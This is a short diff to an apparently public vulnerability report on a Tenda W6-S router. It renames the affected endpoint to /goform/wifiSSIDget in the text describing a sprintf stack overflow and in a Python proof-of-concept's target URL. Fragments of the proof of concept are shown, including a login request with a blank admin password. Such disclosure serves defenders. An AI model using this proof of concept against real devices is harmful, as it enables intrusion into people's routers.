@@ -15,7 +15,7 @@
 
 ![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/W6-S/wifiSSIDget/img/2.png)
 
-In /goform/wifiSSIDset, when wl_radio is 0, the index will be spliced into v93 by sprintf. It is worth noting that there is no size check, which leads to a stack overflow vulnerability.
+In /goform/wifiSSIDget, when wl_radio is 0, the index will be spliced into v93 by sprintf. It is worth noting that there is no size check, which leads to a stack overflow vulnerability.
 
 ## Poc
 
@@ -40,7 +40,7 @@ p1 = 'usertype=admin&password=&time=2022;7;6;14;9;6&username='
 
 requests.post(target_url, headers = target_headers, data = p1, verify = False, timeout = 1)
 
-target_url = 'http://192.168.10.105/goform/wifiSSIDset'
+target_url = 'http://192.168.10.105/goform/wifiSSIDget'
 
 target_headers = {'Host' : '192.168.10.105',
 'Content-Length' : '295',
